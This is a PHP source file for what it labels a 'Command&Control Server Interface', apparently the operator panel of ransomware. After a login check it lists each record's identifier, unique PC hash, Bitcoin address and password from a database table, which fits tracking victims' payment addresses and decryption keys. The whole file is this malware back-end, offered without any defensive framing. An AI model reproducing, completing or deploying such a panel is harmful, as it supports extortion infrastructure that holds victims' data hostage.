<?php
	session_start();
	if( $_SESSION['auth'] != 1 ) {
	    header("Location: login.php");
	    exit;
	}
	include 'db.php';

	$q = $connection->query('SELECT * FROM commandinterface');
?>

<!DOCTYPE html>
<html>
  <head>
     <link rel="stylesheet" href="css/interface.css" type="text/css" />
  </head>
  <body>
	<h1>
		<span class="blue">&lt;</span>Command&Control<span class="blue">&gt;</span> <span class="yellow">Server Interface</pan>
	</h1>
<table class="container" width="1024" style="table-layout: fixed; word-wrap: break-word;">
	<tr>
	  <th>Identifier</th>
	  <th>Unique PC Hash</th>
	  <th>Bitcoin Address</th>
	  <th>Password</th>
	</tr>
 	<tr>
	  <?php
	  	$i = 0;
	  	
	  	foreach($q AS $row) {
	  		echo "<tr" . ($i % 2 ? " class='even'" : "") . ">
	  		<td>".htmlentities($row[id])."</td>
	  		<td>".htmlentities($row[pcname])."</td>
	  		<td>".htmlentities($row[bitcoinaddr])."</td>
	  		<td>".htmlentities($row[password]) . "</td>
	  		</tr>";
	  		$i++;
	  	}
	  ?>
	  </tr>
	</table>
  </body>
</html>
